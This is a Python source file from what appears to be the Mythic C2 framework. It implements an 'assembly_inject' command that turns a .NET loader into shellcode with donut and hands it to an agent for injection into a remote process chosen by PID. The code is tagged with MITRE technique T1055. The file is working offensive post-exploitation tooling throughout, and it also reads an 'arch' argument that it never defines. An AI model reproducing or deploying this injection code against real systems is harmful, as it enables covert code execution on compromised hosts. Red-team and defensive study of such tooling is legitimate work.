from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64
import donut

class AssemblyInjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
            "assembly_name": CommandParameter(name="Assembly Name", type=ParameterType.String, description="Name of the assembly to execute."),
            "assembly_arguments": CommandParameter(name="Assembly Arguments", type=ParameterType.String, description="Arguments to pass to the assembly."),
        }

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=2)
            if len(parts) < 2:
                raise Exception("Invalid number of arguments.\n\tUsage: {}".format(AssemblyInjectCommand.help_cmd))
            pid = parts[0]
            assembly_name = parts[1]
            assembly_args = ""
            assembly_args = ""
            if len(parts) > 2:
                assembly_args = parts[2]
            self.args["pid"].value = pid
            self.args["assembly_name"].value = assembly_name
            self.args["assembly_arguments"].value = assembly_args
        


class AssemblyInjectCommand(CommandBase):
    cmd = "assembly_inject"
    needs_admin = False
    help_cmd = "assembly_inject [pid] [assembly] [args]"
    description = "Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = AssemblyInjectArguments
    attackmapping = ["T1055"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        arch = task.args.get_arg("arch")
        pipe_name = str(uuid4())
        task.args.add_arg("pipe_name", pipe_name)
        exePath = path.join(self.agent_code_path, "ExecuteAssembly/bin/Release/ExecuteAssembly.exe")
        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)

        task.args.remove_arg("arch")
        
        return task

    async def process_response(self, response: AgentResponse):
        pass
